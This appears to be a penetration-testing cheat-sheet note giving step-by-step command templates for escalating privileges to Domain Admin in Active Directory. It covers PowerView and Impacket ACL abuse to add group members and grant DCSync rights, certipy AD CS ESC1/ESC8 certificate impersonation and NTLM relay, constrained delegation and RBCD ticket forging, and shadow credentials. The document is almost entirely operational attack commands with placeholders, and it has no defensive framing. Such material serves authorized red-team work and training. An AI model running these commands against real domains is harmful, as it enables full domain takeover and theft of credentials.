---
title: AD Privesc To DA
type: note
tab: Active Directory
inputs: [Username, Password, Hash, PFX, Shell]
outputs: [DA, DCSync, TGT, Hash]
tags: [ActiveDirectory, PrivilegeEscalation, Kerberos, SMB, LDAP]
---

# AD Privesc To DA

## WHY

Abuse BloodHound paths, AD CS, delegation, or misconfigurations to reach Domain Admin.

## WHEN

- BloodHound shows ACL abuse path.
- AD CS vulnerable template exists.
- You can create/modify computer accounts.
- You found high-value credentials.

## NEXT

- DA achieved: [[Post_DA]]

## Commands

### BloodHound ACL Abuse

#Shell #ActiveDirectory #PrivilegeEscalation
GenericAll on group: add self to target group with PowerView.

```powershell
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

#Username #Password #SMB #ActiveDirectory #PrivilegeEscalation
GenericAll on group with net rpc.

```sh
net rpc group addmem '<GROUP>' '<USER>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>
```

#Shell #ActiveDirectory #PrivilegeEscalation
WriteDACL on domain: grant DCSync rights with PowerView.

```powershell
Add-DomainObjectAcl -TargetIdentity '<DOMAIN_DN>' -PrincipalIdentity '<USER>' -Rights DCSync
```

#Username #Password #ActiveDirectory #PrivilegeEscalation
WriteDACL on domain with Impacket.

```sh
impacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn '<DOMAIN_DN>' '<DOMAIN>/<USER>:<PASS>'
```

#Username #Password #ActiveDirectory #PrivilegeEscalation
ForceChangePassword.

```sh
net rpc password '<TARGET_USER>' '<NEW_PASS>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>
```

### AD CS

#Username #Password #ActiveDirectory #PrivilegeEscalation
ESC1: request cert impersonating admin.

```sh
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn '<ADMIN>@<DOMAIN>' -dc-ip <DC_IP>
```

#PFX #Kerberos #ActiveDirectory #PrivilegeEscalation
Authenticate with PFX and get hash/TGT.

```sh
certipy auth -pfx <ADMIN>.pfx -dc-ip <DC_IP>
```

#Username #Password #ActiveDirectory #PrivilegeEscalation
ESC8: relay NTLM to AD CS.

```sh
certipy relay -target http://<CA_HOST>/certsrv/ -template <TEMPLATE>
```

### Delegation

#Username #Hash #Kerberos #ActiveDirectory #PrivilegeEscalation
Constrained delegation: impersonate DA to CIFS.

```sh
impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<USER> -hashes :<NTLM_HASH>
```

#Username #Password #ActiveDirectory #PrivilegeEscalation
RBCD: add fake computer.

```sh
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASS>' -dc-ip <DC_IP>
```

#Username #Password #ActiveDirectory #PrivilegeEscalation
RBCD: set delegation.

```sh
impacket-rbcd -delegate-from '<FAKE_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action write <DOMAIN>/<USER>:<PASS>
```

#Username #Password #Kerberos #ActiveDirectory #PrivilegeEscalation
RBCD: get service ticket.

```sh
impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<FAKE_COMPUTER>$:<FAKE_PASS> -dc-ip <DC_IP>
```

### Shadow Credentials

#Username #Password #ActiveDirectory #PrivilegeEscalation
Add shadow credentials.

```sh
certipy shadow add -u '<USER>@<DOMAIN>' -p '<PASS>' -account '<TARGET_USER>' -dc-ip <DC_IP>
```

#PFX #Kerberos #ActiveDirectory #PrivilegeEscalation
Authenticate using shadow credential PFX.

```sh
certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>
```

## Priority Order

1. BloodHound obvious edges: GenericAll, WriteDACL, ForceChangePassword, AddMember.
2. AD CS: ESC1/ESC8.
3. Delegation: constrained delegation or RBCD.
4. Shadow Credentials.
5. GPP/SYSVOL passwords.
